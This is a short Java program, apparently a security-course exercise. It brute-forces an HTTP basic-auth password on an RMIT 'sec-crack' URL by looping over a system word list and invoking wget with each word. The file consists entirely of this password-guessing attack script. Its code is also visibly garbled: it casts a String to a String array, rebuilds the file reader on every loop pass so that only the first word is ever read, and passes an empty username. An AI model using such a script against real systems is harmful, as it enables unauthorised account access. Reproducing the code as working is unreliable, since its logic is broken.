import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
public class Dictionary {
    public static void main ( String[] array ) {
        array = ( String[] ) ( Object ) "http://sec-crack.cs.rmit.edu./SEC/2/";
        int n = 0;
        try {
            String line;
            while ( ( line = new BufferedReader ( new FileReader ( "/usr/share/lib/dict/words" ) ).readLine() ) != null ) {
                try {
                    final Process exec = Runtime.getRuntime().exec ( "wget --http-user= --http-passwd=" + line + " " + ( String ) ( Object ) array );
                    final BufferedReader bufferedReader = new BufferedReader ( new InputStreamReader ( exec.getInputStream() ) );
                    final BufferedReader bufferedReader2 = new BufferedReader ( new InputStreamReader ( exec.getErrorStream() ) );
                    String line2;
                    while ( ( line2 = bufferedReader.readLine() ) != null ) {
                        System.out.println ( line2 );
                    }
                    String line3;
                    while ( ( line3 = bufferedReader2.readLine() ) != null ) {
                        System.out.println ( line3 );
                    }
                    try {
                        exec.waitFor();
                    } catch ( InterruptedException ex4 ) {}
                    ++n;
                    if ( exec.exitValue() != 0 ) {
                        continue;
                    }
                    System.out.println ( "**********PASSWORD IS: " + line );
                    System.out.println ( "**********NUMBER OF TRIES: " + n );
                    System.exit ( 1 );
                } catch ( IOException ex ) {
                    System.out.println ( "exception happened - here's what I know: " );
                    ex.printStackTrace();
                    System.exit ( -1 );
                }
            }
            System.out.println ( "DICTIONARY BRUTE FORCE UNABLE  FIND PASSWORD" );
            System.out.println ( "**********Sorry, password was not found in dictionary file" );
            System.exit ( 1 );
        } catch ( FileNotFoundException ex2 ) {
            System.out.println ( ex2 );
        } catch ( IOException ex3 ) {
            System.out.println ( ex3 );
        }
    }
}
